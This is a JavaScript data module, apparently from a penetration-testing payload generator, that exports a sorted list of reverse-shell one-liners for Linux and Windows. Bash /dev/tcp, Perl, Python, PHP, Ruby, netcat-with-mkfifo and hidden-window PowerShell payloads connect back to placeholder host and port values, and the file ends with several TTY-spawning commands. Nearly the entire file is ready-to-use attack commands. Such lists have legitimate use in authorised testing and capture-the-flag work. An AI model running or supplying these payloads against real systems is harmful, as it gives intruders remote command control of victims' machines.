const { sortByCategory, sortByName } = require("../lib/sortObjectsByKey");

let revShellPayloads = [
  {
    category: "Linux",
    name: "Bash",
    payload: "bash -i >& /dev/tcp/CHANGEIP/CHANGEPORT 0>&1",
    id: 0,
  },
  {
    category: "Linux",
    name: "Bash",
    payload:
      "0<&196;exec 196<>/dev/tcp/CHANGEIP/CHANGEPORT; sh <&196 >&196 2>&196",
    id: 1,
  },
  {
    category: "Linux",
    name: "Bash",
    payload: "/bin/bash -l > /dev/tcp/CHANGEIP/CHANGEPORT 0<&1 2>&1",
    id: 2,
  },
  {
    category: "Linux",
    name: "Perl",
    payload:
      'perl -e \'use Socket;$i="CHANGEIP";$p=CHANGEPORT; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};\'',
    id: 3,
  },
  {
    category: "Windows",
    name: "Perl",
    payload:
      "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"CHANGEIP:CHANGEPORT\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    id: 4,
  },
  {
    category: "Linux",
    name: "Python",
    payload:
      'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("CHANGEIP",CHANGEPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    id: 5,
  },
  {
    category: "Windows",
    name: "Python",
    payload:
      'python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'CHANGEIP\',CHANGEPORT));threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start();threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()"',
    id: 6,
  },
  {
    category: "Linux",
    name: "PHP",
    payload:
      'php -r \'$sock=fsockopen("CHANGEIP",CHANGEPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
    id: 7,
  },
  {
    category: "Linux",
    name: "PHP",
    payload:
      'php -r \'$sock=fsockopen("CHANGEIP",CHANGEPORT);system("/bin/sh -i <&3 >&3 2>&3");\'',
    id: 8,
  },
  {
    category: "Linux",
    name: "PHP",
    payload:
      'php -r \'$sock=fsockopen("CHANGEIP",CHANGEPORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");\'',
    id: 9,
  },
  {
    category: "Linux",
    name: "Ruby",
    payload:
      'ruby -rsocket -e\'f=TCPSocket.open("CHANGEIP",CHANGEPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    id: 10,
  },
  {
    category: "Windows",
    name: "Ruby",
    payload:
      'ruby -rsocket -e \'c=TCPSocket.new("CHANGEIP","CHANGEPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
    id: 11,
  },
  {
    category: "Linux",
    name: "Netcat",
    payload: "nc -e /bin/bash CHANGEIP CHANGEPORT",
    id: 12,
  },
  {
    category: "Linux",
    name: "Netcat",
    payload: "nc -c bash CHANGEIP CHANGEPORT",
    id: 13,
  },
  {
    category: "Linux",
    name: "Netcat",
    payload:
      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc CHANGEIP CHANGEPORT >/tmp/f",
    id: 14,
  },
  {
    category: "Windows",
    name: "Powershell",
    payload:
      'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("CHANGEIP",CHANGEPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
    id: 15,
  },
  {
    category: "Windows",
    name: "Powershell",
    payload:
      "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('CHANGEIP',CHANGEPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    id: 16,
  },
  {
    category: "Linux",
    name: "Python3",
    payload:
      'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("CHANGEIP",CHANGEPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    id: 17,
  },
  {
    category: "Spawn TTY Shell",
    name: "python3",
    payload: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    id: 18,
  },
  {
    category: "Spawn TTY Shell",
    name: "python",
    payload: "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    id: 19,
  },
  {
    category: "Spawn TTY Shell",
    name: "perl",
    payload: "perl -e 'exec \"/bin/sh\";'",
    id: 20,
  },
  {
    category: "Spawn TTY Shell",
    name: "sh",
    payload: "/bin/sh -i",
    id: 21,
  },
  {
    category: "Spawn TTY Shell",
    name: "script",
    payload: "script -q /dev/null",
    id: 22,
  },
];

revShellPayloads = sortByCategory(sortByName(revShellPayloads));

// console.log(revShellPayloads);

module.exports = revShellPayloads;
